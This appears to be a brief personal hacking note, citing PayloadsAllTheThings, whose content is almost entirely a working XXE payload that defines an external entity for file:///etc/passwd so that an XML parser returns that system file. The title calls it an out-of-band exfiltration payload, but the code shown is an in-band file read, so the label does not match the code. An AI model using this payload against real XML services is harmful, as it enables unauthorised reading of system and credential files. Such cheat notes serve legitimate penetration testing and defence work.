# XXE xml external entity exfiltrate file out of band payload
PayloadsAllTheThings
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

# Related
- [20221003150975](/zet/20221003150975/README.md) XXE xml external entity
- ~/kb/hacking/methodology/XXE.md

Tags:
    #assorted #hacking #XXE
